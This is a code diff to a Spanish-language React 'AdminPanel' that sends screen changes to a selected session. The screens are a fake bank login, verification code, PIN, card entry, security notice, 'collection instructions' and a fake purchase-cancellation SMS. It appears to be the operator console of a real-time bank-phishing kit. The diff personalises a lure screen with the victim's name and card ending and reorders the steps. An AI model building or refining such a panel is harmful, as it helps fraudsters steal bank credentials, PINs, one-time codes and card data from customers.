@@ -513,11 +513,12 @@ export default function AdminPanel() {
   // Modal handlers
   const closeModal = () => setActiveModal(null);
 
-  const handleProtectConfirm = (amount: string) => {
+  const handleProtectConfirm = (data: { cliente: string, terminacion: string }) => {
     sendScreenChange({
       tipo: 'mostrar_protege',
       sessionId: selectedSessionId,
-      saldo: amount
+      titular: data.cliente,
+      terminacion: data.terminacion
     });
     closeModal();
   };
@@ -692,12 +693,11 @@ export default function AdminPanel() {
                   <option value="login">1. Login</option>
                   <option value="codigo">2. Código de verificación</option>
                   <option value="nip">3. NIP</option>
-                  <option value="protege">4. Protege tu información</option>
-                  <option value="tarjeta">5. Ingresa tarjeta</option>
-                  <option value="transferir">6. Transfiere fondos</option>
-                  <option value="cancelacion">7. Cancelación exitosa</option>
-                  <option value="mensaje">8. Ingresa el mensaje que gustes</option>
-                  <option value="sms_compra">9. SMS Compra - Cancelación de cargos</option>
+                  <option value="protege">4. Aviso de seguridad</option>
+                  <option value="tarjeta">5. Instrucciones recolección</option>
+                  <option value="cancelacion">6. Cancelación exitosa</option>
+                  <option value="mensaje">7. Ingresa el mensaje que gustes</option>
+                  <option value="sms_compra">8. SMS Compra - Cancelación de cargo</option>
                 </select>
               </div>
             </div>
